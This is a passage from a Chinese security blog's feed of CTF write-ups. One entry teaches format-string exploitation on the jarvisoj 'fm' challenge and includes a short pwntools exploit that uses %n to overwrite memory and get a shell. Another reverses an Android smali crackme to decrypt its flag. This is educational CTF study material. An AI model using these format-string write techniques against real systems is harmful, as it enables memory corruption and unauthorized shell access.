        &lt;h3 id=&quot;MISC&quot;&gt;&lt;a href=&quot;#MISC&quot; class=&quot;headerlink&quot; title=&quot;MISC&quot;&gt;&lt;/a&gt;MISC&lt;/h3&gt;&lt;h4 id=&quot;隐藏的信息&quot;&gt;&lt;a href=&quot;#隐藏的信息&quot; class=&quot;headerlink&quot; title=&quot;隐藏的信息&quot;&gt;
      
    
    </summary>
    
      <category term="writeup" scheme="https://j-kangel.github.io/categories/writeup/"/>
    
    
      <category term="CTF" scheme="https://j-kangel.github.io/tags/CTF/"/>
    
      <category term="writeup" scheme="https://j-kangel.github.io/tags/writeup/"/>
    
  </entry>
  
  <entry>
    <title>PWN学习之fmtstr</title>
    <link href="https://j-kangel.github.io/2019/05/01/PWN%E5%AD%A6%E4%B9%A0%E4%B9%8Bfmtstr/"/>
    <id>https://j-kangel.github.io/2019/05/01/PWN学习之fmtstr/</id>
    <published>2019-04-30T20:10:20.000Z</published>
    <updated>2019-06-10T14:53:02.128Z</updated>
    
    <content type="html"><![CDATA[<p>格式化字符串漏洞的原理就不赘述了，直接以jarvisoj上的一道pwn题fm来探寻一下这个漏洞！</p><p>checksec,canary,NX 开启，partial RELRO表示got表可读可写</p><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\1.JPG" alt=""></p><p>IDA查看程序</p><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\2.JPG" alt=""></p><p>存在格式化字符串，gdb调试一下，首先在printf处下一断点</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%d:输出十进制整数，可配上%n向指定地址写数据</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\3.JPG" alt=""></p><p>c继续运行</p><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\4.JPG" alt=""></p><p>-11540是0xffffd2ec作为有符号补码对应的值，说明0xffffd2c0是printf的第一个参数。下面我们来输出一下第三个参数0x50对应的十进制数80。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">%2$d:输入第3个参数的十进制整数。</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\5.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%c:输出字符，可配上%n向指定地址写数据</span><br><span class="line">%2$c:输出第三个参数的字符，即&apos;P&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\6.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%x:输出16进制数据，可以用来泄露内存数据</span><br><span class="line">%3$x:输出第四个参数的内存数据，即f7ffde24</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\7.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%p:输出附加0x前缀的十六进制数据，可用来泄露内存数据</span><br><span class="line">%3$p:输出第四个参数的内存数据，即0xf7ffde24</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\8.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%s:输出参数地址所指向的字符串，可用于读取got表、canary等信息</span><br><span class="line">%6$s:输出第六个参数作为地址所指向的内容，即0x28fc表示的字符串</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\9.JPG" alt=""></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">%n:将输出的字符个数写到参数所指向的地址中，可用来修改内存中变量的值</span><br><span class="line">%4c%6$n:将第六个参数指向的地址空间的值修改为4,即0xf7ffd000 --&gt; 0x4</span><br></pre></td></tr></table></figure><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\10.JPG" alt=""></p><p>再来回顾一下这道题，x原来的值为3，需要修改为4才能拿到shell。</p><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\11.JPG" alt=""></p><p>即将0x0804a02c的值修改为4。所以需要将0x0804a02c写入内存并确定它的偏移。首先确定偏移</p><p><img src="/2019/05/01/PWN学习之fmtstr/F:/blog\Hexo\source\_posts\PWN学习之fmtstr\12.JPG" alt=""></p><p>‘aaaa’是我输入的内容，偏移为11，32位地址刚好四个字节，exp如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = remote(<span class="string">"pwn2.jarvisoj.com"</span>,<span class="string">"9895"</span>)</span><br><span class="line"></span><br><span class="line">x_addr = <span class="number">0x0804a02c</span></span><br><span class="line">payload = p32(x_addr) + <span class="string">"%11$n"</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;格式化字符串漏洞的原理就不赘述了，直接以jarvisoj上的一道pwn题fm来探寻一下这个漏洞！&lt;/p&gt;
&lt;p&gt;checksec,canary,NX 开启，partial RELRO表示got表可读可写&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2019/05/01/PWN学习之
      
    
    </summary>
    
      <category term="pwn学习" scheme="https://j-kangel.github.io/categories/pwn%E5%AD%A6%E4%B9%A0/"/>
    
    
      <category term="pwn" scheme="https://j-kangel.github.io/tags/pwn/"/>
    
  </entry>
  
  <entry>
    <title>smali</title>
    <link href="https://j-kangel.github.io/2019/04/18/smali/"/>
    <id>https://j-kangel.github.io/2019/04/18/smali/</id>
    <published>2019-04-17T16:10:39.000Z</published>
    <updated>2019-04-19T15:02:09.793Z</updated>
    
    <content type="html"><![CDATA[<h3 id="smali简介"><a href="#smali简介" class="headerlink" title="smali简介"></a>smali简介</h3><p>既然是简介，我觉得一句话就够了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Smali是Dalvik的寄存器语言，它与Java的关系，简单理解就是汇编之于C。</span><br></pre></td></tr></table></figure><h3 id="一道题目剖析smali"><a href="#一道题目剖析smali" class="headerlink" title="一道题目剖析smali"></a>一道题目剖析smali</h3><p>题目来自于jarvisOJ smali。Crackme.smali，文件内容如下：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br></pre></td><td class="code"><pre><span class="line">.class <span class="keyword">public</span> Lnet/bluelotus/tomorrow/easyandroid/Crackme;</span><br><span class="line">.<span class="keyword">super</span> Ljava/lang/Object;</span><br><span class="line">.source <span class="string">"Crackme.java"</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># instance fields</span><br><span class="line">.field <span class="keyword">private</span> str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># direct methods</span><br><span class="line">.method <span class="keyword">public</span> constructor &lt;init&gt;()V</span><br><span class="line">    .locals <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">22</span></span><br><span class="line">    invoke-direct &#123;p0&#125;, Ljava/lang/Object;-&gt;&lt;init&gt;()V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">21</span></span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span></span><br><span class="line"></span><br><span class="line">    iput-object v0, p0, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">23</span></span><br><span class="line">    <span class="keyword">const</span>-string v0, <span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0, v0&#125;, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;GetFlag(Ljava/lang/String;)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .line <span class="number">24</span></span><br><span class="line">    <span class="keyword">return</span>-<span class="keyword">void</span></span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">GetFlag</span><span class="params">(Ljava/lang/String;)</span>Ljava/lang/String</span>;</span><br><span class="line">    .locals <span class="number">4</span></span><br><span class="line">    .param p1, "str"    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v3, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">27</span></span><br><span class="line">    invoke-virtual &#123;p1&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Landroid/util/Base64;-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">29</span></span><br><span class="line">    .local v0, <span class="string">"content"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v1, Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    iget-object v2, p0, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;str2:Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v2, v3&#125;, Landroid/util/Base64;-&gt;decode([BI)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v2</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v1, v2&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">30</span></span><br><span class="line">    .local v1, <span class="string">"kk"</span>:Ljava/lang/String;</span><br><span class="line">    sget-object v2, Ljava/lang/System;-&gt;out:Ljava/io/PrintStream;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;p0, v0, v1&#125;, Lnet/bluelotus/tomorrow/easyandroid/Crackme;-&gt;decrypt([BLjava/lang/String;)Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    move-result-object v3</span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v2, v3&#125;, Ljava/io/PrintStream;-&gt;println(Ljava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">31</span></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v2, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>-object v2</span><br><span class="line">.end method</span><br><span class="line"></span><br><span class="line">.<span class="function">method <span class="keyword">private</span> <span class="title">decrypt</span><span class="params">([BLjava/lang/String;)</span>Ljava/lang/String</span>;</span><br><span class="line">    .locals <span class="number">8</span></span><br><span class="line">    .param p1, "content"    # [B</span><br><span class="line">    .param p2, "password"    # Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    .prologue</span><br><span class="line">    .line <span class="number">35</span></span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v4, <span class="number">0x0</span></span><br><span class="line"></span><br><span class="line">    .line <span class="number">37</span></span><br><span class="line">    .local v4, <span class="string">"m"</span>:Ljava/lang/String;</span><br><span class="line">    :try_start_0</span><br><span class="line">    invoke-virtual &#123;p2&#125;, Ljava/lang/String;-&gt;getBytes()[B</span><br><span class="line"></span><br><span class="line">    move-result-object v3</span><br><span class="line"></span><br><span class="line">    .line <span class="number">38</span></span><br><span class="line">    .local v3, <span class="string">"keyStr"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v2, Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">const</span>-string v7, <span class="string">"AES"</span></span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v2, v3, v7&#125;, Ljavax/crypto/spec/SecretKeySpec;-&gt;&lt;init&gt;([BLjava/lang/String;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">39</span></span><br><span class="line">    .local v2, <span class="string">"key"</span>:Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line">    <span class="keyword">const</span>-string v7, <span class="string">"AES/ECB/NoPadding"</span></span><br><span class="line"></span><br><span class="line">    invoke-<span class="keyword">static</span> &#123;v7&#125;, Ljavax/crypto/Cipher;-&gt;getInstance(Ljava/lang/String;)Ljavax/crypto/Cipher;</span><br><span class="line"></span><br><span class="line">    move-result-object v0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">40</span></span><br><span class="line">    .local v0, <span class="string">"cipher"</span>:Ljavax/crypto/Cipher;</span><br><span class="line">    <span class="keyword">const</span>/<span class="number">4</span> v7, <span class="number">0x2</span></span><br><span class="line"></span><br><span class="line">    invoke-virtual &#123;v0, v7, v2&#125;, Ljavax/crypto/Cipher;-&gt;init(ILjava/security/Key;)V</span><br><span class="line"></span><br><span class="line">    .line <span class="number">41</span></span><br><span class="line">    invoke-virtual &#123;v0, p1&#125;, Ljavax/crypto/Cipher;-&gt;doFinal([B)[B</span><br><span class="line"></span><br><span class="line">    move-result-object v6</span><br><span class="line"></span><br><span class="line">    .line <span class="number">42</span></span><br><span class="line">    .local v6, <span class="string">"result"</span>:[B</span><br><span class="line">    <span class="keyword">new</span>-instance v5, Ljava/lang/String;</span><br><span class="line"></span><br><span class="line">    invoke-direct &#123;v5, v6&#125;, Ljava/lang/String;-&gt;&lt;init&gt;([B)V</span><br><span class="line">    :try_end_0</span><br><span class="line">    .<span class="keyword">catch</span> Ljava/security/NoSuchAlgorithmException; &#123;:try_start_0 .. :try_end_0&#125; :catch_1</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/NoSuchPaddingException; &#123;:try_start_0 .. :try_end_0&#125; :catch_0</span><br><span class="line">    .<span class="keyword">catch</span> Ljava/security/InvalidKeyException; &#123;:try_start_0 .. :try_end_0&#125; :catch_4</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/IllegalBlockSizeException; &#123;:try_start_0 .. :try_end_0&#125; :catch_2</span><br><span class="line">    .<span class="keyword">catch</span> Ljavax/crypto/BadPaddingException; &#123;:try_start_0 .. :try_end_0&#125; :catch_3</span><br><span class="line"></span><br><span class="line">    .end local v4    # "m":Ljava/lang/String;</span><br><span class="line">    .local v5, <span class="string">"m"</span>:Ljava/lang/String;</span><br><span class="line">    move-object v4, v5</span><br><span class="line"></span><br><span class="line">    .line <span class="number">46</span></span><br><span class="line">    .end local v0    # "cipher":Ljavax/crypto/Cipher;</span><br><span class="line">    .end local v2    # "key":Ljavax/crypto/spec/SecretKeySpec;</span><br><span class="line">    .end local v3    # "keyStr":[B</span><br><span class="line">    .end local v5    # "m":Ljava/lang/String;</span><br><span class="line">    .end local v6    # "result":[B</span><br><span class="line">    .restart local v4    # "m":Ljava/lang/String;</span><br><span class="line">    :goto_0</span><br><span class="line">    <span class="keyword">return</span>-object v4</span><br><span class="line"></span><br><span class="line">    .line <span class="number">43</span></span><br><span class="line">    :catch_0</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    .line <span class="number">44</span></span><br><span class="line">    .local v1, <span class="string">"e"</span>:Ljava/security/GeneralSecurityException;</span><br><span class="line">    :goto_1</span><br><span class="line">    invoke-virtual &#123;v1&#125;, Ljava/security/GeneralSecurityException;-&gt;printStackTrace()V</span><br><span class="line"></span><br><span class="line">    goto :goto_0</span><br><span class="line"></span><br><span class="line">    .line <span class="number">43</span></span><br><span class="line">    .end local v1    # "e":Ljava/security/GeneralSecurityException;</span><br><span class="line">    :catch_1</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_2</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_3</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line"></span><br><span class="line">    :catch_4</span><br><span class="line">    move-exception v1</span><br><span class="line"></span><br><span class="line">    goto :goto_1</span><br><span class="line">.end method</span><br></pre></td></tr></table></figure><p>算了，还是不剖析了，以后碰到smali文件就直接转java文件好了。工具smali2java，得到java代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> net.bluelotus.tomorrow.easyandroid;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> android.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] <span class="string">"content"</span> = Base64.decode(p1.getBytes(), <span class="number">0x0</span>);</span><br><span class="line">        String <span class="string">"kk"</span> = <span class="keyword">new</span> String(Base64.decode(str2.getBytes(), <span class="number">0x0</span>));</span><br><span class="line">        System.out.println(decrypt(<span class="string">"content"</span>, <span class="string">"kk"</span>));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span>&#123;</span><br><span class="line">        String <span class="string">"m"</span> = <span class="number">0x0</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">"keyStr"</span> = p2.getBytes();</span><br><span class="line">            SecretKeySpec <span class="string">"key"</span> = <span class="keyword">new</span> SecretKeySpec(<span class="string">"keyStr"</span>, <span class="string">"AES"</span>);</span><br><span class="line">            Cipher <span class="string">"cipher"</span> = Cipher.getInstance(<span class="string">"AES/ECB/NoPadding"</span>);</span><br><span class="line">            <span class="string">"cipher"</span>.init(<span class="number">0x2</span>, <span class="string">"key"</span>);</span><br><span class="line">            <span class="keyword">byte</span>[] <span class="string">"result"</span> = <span class="string">"cipher"</span>.doFinal(p1);</span><br><span class="line">            <span class="keyword">return</span> <span class="string">"m"</span>;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(NoSuchPaddingException <span class="string">"e"</span>) &#123;</span><br><span class="line">            <span class="string">"e"</span>.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  <span class="string">"m"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这作为普通java文件当然是不能直接运行的，可以稍微修改一下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"><span class="keyword">import</span> java.io.PrintStream;</span><br><span class="line"><span class="keyword">import</span> java.security.NoSuchAlgorithmException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.NoSuchPaddingException;</span><br><span class="line"><span class="keyword">import</span> java.security.InvalidKeyException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.IllegalBlockSizeException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.BadPaddingException;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.spec.SecretKeySpec;</span><br><span class="line"><span class="keyword">import</span> javax.crypto.Cipher;</span><br><span class="line"><span class="keyword">import</span> java.security.Key;</span><br><span class="line"><span class="keyword">import</span> java.security.GeneralSecurityException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Crackme</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String str2 = <span class="string">"cGhyYWNrICBjdGYgMjAxNg=="</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Crackme</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        GetFlag(<span class="string">"sSNnx1UKbYrA1+MOrdtDTA=="</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">GetFlag</span><span class="params">(String p1)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">byte</span>[] content = Base64.getDecoder().decode(p1);</span><br><span class="line">        String kk = <span class="keyword">new</span> String(Base64.getDecoder().decode(str2));</span><br><span class="line">        System.out.println(decrypt(content, kk));</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">private</span> String <span class="title">decrypt</span><span class="params">(<span class="keyword">byte</span>[] p1, String p2)</span> </span>&#123;</span><br><span class="line">        String m = <span class="string">"0x0"</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">byte</span>[] keyStr = p2.getBytes();</span><br><span class="line">            SecretKeySpec key = <span class="keyword">new</span> SecretKeySpec(keyStr, <span class="string">"AES"</span>);</span><br><span class="line">            Cipher cipher = Cipher.getInstance(<span class="string">"AES/ECB/NoPadding"</span>);</span><br><span class="line">            cipher.init(<span class="number">0x2</span>, key);</span><br><span class="line">            <span class="keyword">byte</span>[] result = cipher.doFinal(p1);</span><br><span class="line">            String s = <span class="keyword">new</span> String(result);</span><br><span class="line">            <span class="keyword">return</span> m;</span><br><span class="line">        &#125; <span class="keyword">catch</span>(Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span>  m;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>配合test.java，可以直接在命令执行</p><figure class="highlight 